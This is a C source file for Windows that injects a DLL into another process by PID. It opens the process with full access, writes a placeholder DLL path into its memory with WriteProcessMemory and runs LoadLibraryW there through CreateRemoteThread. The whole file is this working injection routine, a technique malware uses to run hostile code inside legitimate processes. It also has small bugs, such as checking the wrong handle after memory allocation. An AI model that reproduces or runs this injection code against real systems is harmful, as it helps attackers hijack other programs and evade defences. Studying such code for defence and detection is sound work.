#include <stdio.h>
#include <Windows.h>


DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess = NULL, hThread = NULL;
HMODULE hKernel32 = NULL;

wchar_t dllPath[MAX_PATH] = L"PATHTODLL";
size_t dllPathSize = sizeof(dllPath);

const char* SUCCESS = " [+] ";
const char* FAIL = " [!] ";
const char* INFO = " [*] ";

int main(int argc, char* argv[])
{
	if (argc < 2) 
	{
		PID = GetCurrentProcessId();
		printf("%s Attempt to inject DLL into myself, PID: %ld\n", INFO, PID);
		printf("I'll probably fail at the end because of this\n");
	}
	else {
		PID = atoi(argv[1]);
		printf("%s Attempt to inject DLL into process with PID: %ld\n", INFO, PID);
	}

	printf("%s Trying to get a handle to the process (%ld)\n", INFO, PID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL)
	{
		printf("%s Failed to get a handle to the process, error: %ld", FAIL, GetLastError());
		return EXIT_FAILURE;
	}
	else {
		printf("%s Got a handle to the process (%ld)\n\\--0x%p\n", SUCCESS, PID, hProcess);
	}
	
	printf("%s Attempting to allocate memory for Dll..\n", INFO);
	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (hProcess == NULL)
	{
		printf("%s Failed to get a handle to allocate memory for dll, error: %ld", FAIL, GetLastError());
		return EXIT_FAILURE;
	}
	else {
		printf("%s Allocated buffer to process memory\n", SUCCESS);
	}
	
	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);	
	printf("%s Attempting to grab handle to Kernel32..\n", INFO);
	hKernel32 = GetModuleHandleW(L"Kernel32");
	if (hKernel32 == NULL)
	{
		printf("%s Failed to grab handle to Kernel32, error: %ld", FAIL, GetLastError());
		CloseHandle(hKernel32);
		return EXIT_FAILURE;
	}
	else {
		printf("%s Grabbed handle to kernel32! \n", SUCCESS);
	}
	
	printf("%s Attempting to find address of LoadLibraryW\n", INFO);
	LPTHREAD_START_ROUTINE started = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	if (started == NULL)
	{
		printf("%S Failed to GetProcAddress\n", FAIL);
		CloseHandle(started);
		return EXIT_FAILURE;
	}
	printf("%s The address of LoadLibraryW() is %p\n", INFO, started);

	printf("%s Attempting to start thread\n", INFO);
	hThread = CreateRemoteThread(hProcess, NULL, 0, started, rBuffer, 0, &TID);
	if (hThread == NULL)
	{
		printf("%s Failed to start thread, error: %ld", FAIL, GetLastError());
		CloseHandle(hKernel32);
		return EXIT_FAILURE;
	}
	printf("%s Got handle to new thread (%ld): %p\n", SUCCESS, TID, hThread);
	
	//Wait here till the alert box is closed
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hKernel32);
	return EXIT_SUCCESS;
}

